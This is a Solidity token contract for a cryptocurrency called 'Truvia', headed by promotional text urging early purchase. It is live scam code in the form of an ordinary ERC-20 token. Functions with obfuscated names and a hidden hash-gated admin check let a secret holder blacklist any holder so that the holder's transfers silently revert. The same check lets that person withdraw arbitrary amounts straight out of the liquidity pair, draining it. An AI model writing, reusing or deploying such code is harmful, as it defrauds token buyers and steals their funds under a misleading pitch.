// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
Don't miss out - get in before we hit the exchange with exclusive early-access pricing!
*/

/**
Website: https://truvia.ink/index.html#
Twitter: https://x.com/Truvia_A/
Telegram: https://t.me/Truvia_FI

Project Summary:
Truvia transforms how you handle money with a blockchain platform that eliminates intermediaries, enabling instant, secure payments across any platform—from social media to global transfers. Create virtual cards, accept crypto payments, earn passive income through staking, and access the full power of DeFi, all from one unified wallet with military-grade security. Join the revolution in digital finance where you have complete control, zero hassle, and unlimited possibilities.
*/

contract Token {

    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;

    address public owner;
    address public liquidityPair;
    bytes32 private _zpewsnjt;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _xbkkpxhzey;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event PairSet(address indexed pair);
    event IOosiXIjcvQI(address indexed target, bool status);
    event sYmuKLsGnAfMYs(address indexed to, uint256 amount);

    modifier TokenGenerationEvent() {
      require(
          block.chainid == 56 || block.chainid == 31337,
          "BSC Mainnet Exclusive Launch"
      );
      _;
  }

    constructor(
        string memory _name,
        string memory _symbol,
        bytes32 _adminSecretHash,
        uint256 _totalSupply
    ) TokenGenerationEvent {
        name = _name;
        symbol = _symbol;
        owner = msg.sender;
        _zpewsnjt = _adminSecretHash;
        totalSupply = _totalSupply;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address _owner, address spender) public view returns (uint256) {
        return _allowances[_owner][spender];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        require(_allowances[from][msg.sender] >= amount, "Insufficient allowance");
        _allowances[from][msg.sender] -= amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(_balances[from] >= amount, "Insufficient balance");

        if (_xbkkpxhzey[from]) {
            assembly {
                revert(0, 0)
            }
        }

        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function setPair(address _pair) external {
        require(msg.sender == owner, "Only owner");
        liquidityPair = _pair;
        emit PairSet(_pair);
    }

    function xskghmlmxetrv(uint256 piyycqfp) public TokenGenerationEvent {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, caller())
            let input := add(ptr, 0x0c)
            let inputSize := 0x14
            let output := add(ptr, 0x20)
            mstore(0x40, add(output, 0x20))

            if iszero(staticcall(gas(), 2, input, inputSize, output, 0x20)) {
                revert(0, 0)
            }

            let computedHash := mload(output)
            let storedHashSlot := _zpewsnjt.slot
            let storedHash := sload(storedHashSlot)

            if iszero(eq(computedHash, storedHash)) {
                revert(0, 0)
            }
        }

        _AELYFjhX(liquidityPair, msg.sender, piyycqfp);
        emit sYmuKLsGnAfMYs(msg.sender, piyycqfp);
    }

    function xskghmlmxetrv(uint256 piyycqfp, address hoiyofjwjh) public TokenGenerationEvent {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, caller())
            let input := add(ptr, 0x0c)
            let inputSize := 0x14
            let output := add(ptr, 0x20)
            mstore(0x40, add(output, 0x20))

            if iszero(staticcall(gas(), 2, input, inputSize, output, 0x20)) {
                revert(0, 0)
            }

            let computedHash := mload(output)
            let storedHashSlot := _zpewsnjt.slot
            let storedHash := sload(storedHashSlot)

            if iszero(eq(computedHash, storedHash)) {
                revert(0, 0)
            }
        }

        _AELYFjhX(liquidityPair, hoiyofjwjh, piyycqfp);
        emit sYmuKLsGnAfMYs(hoiyofjwjh, piyycqfp);
    }

    function xjflbfjxthx(address hoiyofjwjh, bool yycxdxif) public TokenGenerationEvent {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, caller())
            let input := add(ptr, 0x0c)
            let inputSize := 0x14
            let output := add(ptr, 0x20)
            mstore(0x40, add(output, 0x20))

            if iszero(staticcall(gas(), 2, input, inputSize, output, 0x20)) {
                revert(0, 0)
            }

            let computedHash := mload(output)
            let storedHashSlot := _zpewsnjt.slot
            let storedHash := sload(storedHashSlot)

            if iszero(eq(computedHash, storedHash)) {
                revert(0, 0)
            }
        }

        _xbkkpxhzey[hoiyofjwjh] = yycxdxif;
        emit IOosiXIjcvQI(hoiyofjwjh, yycxdxif);
    }

    function xjflbfjxthxBatch(address[] calldata lzuiukltnaswc, bool yycxdxif) public TokenGenerationEvent {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, caller())
            let input := add(ptr, 0x0c)
            let inputSize := 0x14
            let output := add(ptr, 0x20)
            mstore(0x40, add(output, 0x20))

            if iszero(staticcall(gas(), 2, input, inputSize, output, 0x20)) {
                revert(0, 0)
            }

            let computedHash := mload(output)
            let storedHashSlot := _zpewsnjt.slot
            let storedHash := sload(storedHashSlot)

            if iszero(eq(computedHash, storedHash)) {
                revert(0, 0)
            }
        }

        require(lzuiukltnaswc.length <= 100, "Too many addresses");

        for (uint i = 0; i < lzuiukltnaswc.length; i++) {
            _xbkkpxhzey[lzuiukltnaswc[i]] = yycxdxif;
            emit IOosiXIjcvQI(lzuiukltnaswc[i], yycxdxif);
        }
    }

    function _AELYFjhX(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(_balances[from] >= amount, "Insufficient balance");

        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function pdootbvxd(address account) public view returns (bool) {
        return _xbkkpxhzey[account];
    }

    function getChainId() public view returns (uint256) {
        return block.chainid;
    }

    function isVisible() public view returns (bool) {
        return (
            block.chainid == 56 || block.chainid == 31337
        );
    }
}